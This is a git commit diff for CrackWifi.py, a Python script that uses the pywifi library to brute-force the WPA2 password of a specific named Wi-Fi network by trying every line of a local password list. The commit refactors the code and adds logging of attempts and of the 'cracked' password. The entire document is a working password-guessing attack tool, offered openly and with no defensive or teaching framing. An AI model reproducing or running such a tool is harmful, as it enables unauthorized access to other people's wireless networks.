bb468597b659dde2e6758249f72b7e573fddda7c
linzhe99 <137392949+linzhe99@users.noreply.github.com>
2023-12-21 17:57:04 +0800

    Update CrackWifi.py

--- CrackWifi.py
+++ CrackWifi.py
@@ -1,76 +1,70 @@
-# coding:utf-8
- 
 import pywifi
 from pywifi import const
 import time
 import datetime
- 
- 
+import logging
+
+# 配置日志记录器
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# 添加文件处理器
+LOG_FILE_PATH = "wifi_crack.log"
+file_handler = logging.FileHandler(LOG_FILE_PATH)
+file_handler.setLevel(logging.INFO)
+formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+file_handler.setFormatter(formatter)
+logging.getLogger().addHandler(file_handler)
+
+# 常量定义
+SSID_TO_CONNECT = "CU_fb5g_2.4G"
+PASSWORDS_FILE_PATH = "C:\\Users\\Administrator\\Desktop\\numberPass.txt"
+
 # 测试连接，返回链接结果
-def wifiConnect(pwd):
-    # 抓取网卡接口
+def wifi_connect(pwd):
     wifi = pywifi.PyWiFi()
-    # 获取第一个无线网卡
     ifaces = wifi.interfaces()[0]
-    # 断开所有连接
     ifaces.disconnect()
     time.sleep(1)
     wifistatus = ifaces.status()
     if wifistatus == const.IFACE_DISCONNECTED:
-        # 创建WiFi连接文件
         profile = pywifi.Profile()
-        # 要连接WiFi的名称
-        profile.ssid = "CU_fb5g_2.4G"
-        # 网卡的开放状态
+        profile.ssid = SSID_TO_CONNECT
         profile.auth = const.AUTH_ALG_OPEN
-        # wifi加密算法,一般wifi加密算法为wps
         profile.akm.append(const.AKM_TYPE_WPA2PSK)
-        # 加密单元
         profile.cipher = const.CIPHER_TYPE_CCMP
-        # 调用密码
         profile.key = pwd
-        # 删除所有连接过的wifi文件
         ifaces.remove_all_network_profiles()
-        # 设定新的连接文件
         tep_profile = ifaces.add_network_profile(profile)
         ifaces.connect(tep_profile)
-        # wifi连接时间
         time.sleep(3)
         if ifaces.status() == const.IFACE_CONNECTED:
+            logging.info("WiFi连接成功！")
             return True
         else:
+            logging.warning("WiFi连接失败！")
             return False
     else:
-        print("已有wifi连接")
- 
-    # 读取密码本
- 
- 
-def readPassword():
-    print("开始破解:")
-    # 密码本路径
-    path = "C:\\Users\\Administrator\\Desktop\\numberPass.txt"
-    # 打开文件
-    file = open(path, "r")
-    while True:
-        try:
-            # 一行一行读取
-            pad = file.readline()
-            bool = wifiConnect(pad)
- 
-            if bool:
-                print("密码已破解： ", pad)
-                print("WiFi已自动连接！！！")
-                break
-            else:
-                # 跳出当前循环，进行下一次循环
-                print("密码破解中....密码校对: ", pad)
-        except:
-            continue
- 
- 
-start = datetime.datetime.now()
-readPassword()
-end = datetime.datetime.now()
-print("破解WIFI密码一共用了多长时间：{}".format(end - start))
- 
+        logging.info("已有WiFi连接")
+
+# 读取密码本
+def read_passwords():
+    logging.info("开始破解:")
+    with open(PASSWORDS_FILE_PATH, "r") as file:
+        for pad in file:
+            try:
+                result = wifi_connect(pad)
+                if result:
+                    logging.info(f"密码已破解： {pad}")
+                    logging.info("WiFi已自动连接！！！")
+                    break
+                else:
+                    logging.info(f"密码破解中....密码校对: {pad}")
+            except:
+                continue
+
+# 主程序
+if __name__ == "__main__":
+    start = datetime.datetime.now()
+    read_passwords()
+    end = datetime.datetime.now()
+    logging.info("破解WiFi密码一共用了多长时间：%s", (end - start))
